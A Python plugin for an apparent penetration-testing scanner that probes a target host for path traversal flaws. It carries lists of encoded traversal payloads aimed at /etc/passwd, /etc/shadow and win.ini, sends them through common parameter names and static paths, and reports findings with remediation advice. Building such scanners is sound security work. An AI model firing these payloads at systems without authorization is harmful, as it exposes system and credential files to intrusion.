"""Path Traversal / Directory Traversal vulnerability detection."""

from __future__ import annotations

from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("....//....//....//etc/passwd", "root:"),
    ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
    ("/etc/passwd", "root:"),
    ("file:///etc/passwd", "root:"),
    ("....//....//....//etc/shadow", "root:"),
    ("..%00/etc/passwd", "root:"),
    # Additional encodings
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
    ("..%ef%bc%8f..%ef%bc%8fetc/passwd", "root:"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]"),
    ("/..../..../..../etc/passwd", "root:"),
    ("..;/..;/..;/etc/passwd", "root:"),
    ("..%u2216..%u2216etc/passwd", "root:"),
    ("\\\\..\\\\..\\\\..\\\\etc\\\\passwd", "root:"),
]

TRAVERSAL_PARAMS = [
    "file", "path", "page", "document", "folder", "dir",
    "img", "image", "include", "template", "content",
    "download", "filepath", "filename", "loc", "location",
]

SCAN_PAGES = [
    "/", "/download", "/file", "/read",
    "/view", "/include", "/page", "/load",
]

PATH_BASED_CHECKS = [
    ("/static/../../../../etc/passwd", "root:"),
    ("/assets/..%2f..%2f..%2f..%2fetc/passwd", "root:"),
    ("/img/..%2f..%2f..%2f..%2fetc/passwd", "root:"),
    ("/css/../../../etc/passwd", "root:"),
    ("/js/..%5c..%5c..%5c..%5cwindows/win.ini", "[fonts]"),
    ("/download?file=../../../../etc/passwd", "root:"),
]


class PathTraversalPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="path_traversal",
        display_name="Path Traversal Check",
        category=PluginCategory.PENTESTING,
        description="Checks for directory/path traversal vulnerabilities",
        produces=["path_traversal_findings"],
        timeout=25.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host,
                error="HTTP client not available",
            )

        findings: list[Finding] = []
        confirmed: list[dict] = []
        tested_count = 0
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(
                        f"{scheme}://{target.host}/", timeout=5.0,
                    )
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"traversal_tests": [], "tested_count": 0},
            )

        # Phase 1: parameter-based traversal
        for page in SCAN_PAGES:
            for param in TRAVERSAL_PARAMS:
                for payload, indicator in TRAVERSAL_PAYLOADS:
                    url = f"{base_url}{page}?{param}={payload}"
                    tested_count += 1
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(
                                url, timeout=8.0,
                            )
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )

                            if indicator in body:
                                confirmed.append({
                                    "type": "parameter",
                                    "page": page,
                                    "param": param,
                                    "payload": payload,
                                    "indicator": indicator,
                                    "url": url,
                                })
                                findings.append(Finding.critical(
                                    f"Path traversal via "
                                    f"{page}?{param}=",
                                    description=(
                                        f"Server returns local file "
                                        f"content with payload: "
                                        f"{payload}"
                                    ),
                                    evidence=(
                                        f"Response contains: "
                                        f"{indicator}"
                                    ),
                                    remediation=(
                                        "Sanitize user input. Never "
                                        "use raw parameters in file "
                                        "paths. Use a whitelist of "
                                        "allowed files or an ID-based "
                                        "lookup instead."
                                    ),
                                    tags=[
                                        "pentesting",
                                        "path-traversal",
                                    ],
                                ))
                                break
                    except Exception:
                        continue

        # Phase 2: path-based traversal
        for path_suffix, indicator in PATH_BASED_CHECKS:
            url = f"{base_url}{path_suffix}"
            tested_count += 1
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )

                    if indicator in body:
                        confirmed.append({
                            "type": "path",
                            "path": path_suffix,
                            "indicator": indicator,
                            "url": url,
                        })
                        findings.append(Finding.critical(
                            f"Path-based traversal: "
                            f"{path_suffix}",
                            description=(
                                "Server resolves traversal "
                                "sequences in URL path"
                            ),
                            evidence=(
                                f"Response contains: {indicator}"
                            ),
                            remediation=(
                                "Configure the web server to "
                                "reject path traversal sequences. "
                                "Use realpath validation before "
                                "serving static files."
                            ),
                            tags=["pentesting", "path-traversal"],
                        ))
            except Exception:
                continue

        if not findings:
            findings.append(Finding.info(
                "No path traversal vulnerabilities detected",
                description=(
                    f"Tested {tested_count} combinations "
                    f"across {len(SCAN_PAGES)} pages"
                ),
                tags=["pentesting", "path-traversal"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "traversal_tests": confirmed,
                "tested_count": tested_count,
            },
        )
